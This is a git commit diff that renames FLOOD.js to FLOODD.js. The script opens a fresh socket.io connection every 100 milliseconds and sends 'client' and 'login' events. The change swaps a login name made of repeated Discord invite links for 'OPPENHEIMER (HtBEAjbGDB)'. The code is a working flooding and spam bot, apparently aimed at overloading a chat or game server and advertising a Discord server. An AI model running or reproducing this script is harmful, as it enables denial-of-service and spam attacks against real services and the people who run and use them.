45827a2c33a1d19071039ba6f7b000c312cca881
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-10-28 16:17:45 +0300

    Update and rename FLOOD.js to FLOODD.js

--- FLOODD.js
+++ FLOODD.js
@@ -2,6 +2,6 @@ setInterval(() => {
     const socketb = io("//");
     socketb.emit("client", "MAIN");
     socketb.emit("login", {
-        name: "https://discord.gg/HtBEAjbGDB https://discord.gg/HtBEAjbGDB https://discord.gg/HtBEAjbGDB"
+        name: "OPPENHEIMER (HtBEAjbGDB)"
     });
 }, 100)
